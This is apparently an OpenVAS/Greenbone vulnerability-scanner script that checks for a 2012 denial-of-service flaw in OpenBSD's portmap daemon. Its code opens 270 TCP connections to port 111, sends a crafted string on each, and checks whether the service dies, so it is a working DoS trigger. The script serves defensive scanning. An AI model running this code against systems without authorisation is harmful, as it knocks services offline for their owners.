# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803091");
  script_version("2023-09-08T05:06:21+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-09-08 05:06:21 +0000 (Fri, 08 Sep 2023)");
  script_tag(name:"creation_date", value:"2012-12-26 10:49:16 +0530 (Wed, 26 Dec 2012)");
  script_name("OpenBSD < 5.2 Portmap Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_rpc_portmap_tcp_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("rpc/portmap/tcp/detected", "Host/runs_unixoide");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51299/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56671");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1027814");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/51299");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Nov/168");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2012-11/0169.html");

  script_tag(name:"summary", value:"Portmap running on OpenBSD is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted TCP request and checks if the host is still
  alive.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of
  service condition.");

  script_tag(name:"affected", value:"Portmap running on OpenBSD versions prior to 5.2. Other
  operating systems might be affected as well.");

  script_tag(name:"insight", value:"The flaw is due to an error when handling multiple RPC requests
  and can be exploited to crash the portmap daemon via specially crafted packets
  sent to TCP port 111.");

  script_tag(name:"solution", value:"Apply the patch provided by the vendor.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

nfsPort = get_kb_item("rpc/portmap/port");
if(!nfsPort){
  nfsPort = 111;
}

if(!get_port_state(nfsPort)){
  exit(0);
}

soc = open_sock_tcp(nfsPort);
if(!soc){
  exit(0);
}

close(soc);

testmsg = "8========@";

for (i = 0; i < 270; i++)
{
  soc = open_sock_tcp(nfsPort);
  if(!soc){
    break;
  }
  send(socket:soc, data: testmsg);
}

if(soc){
  close(soc);
}

sleep(1);

soc2 = open_sock_tcp(nfsPort);

if(!soc2){
  security_message(port:nfsPort);
  exit(0);
}

close(soc2);

exit(99);
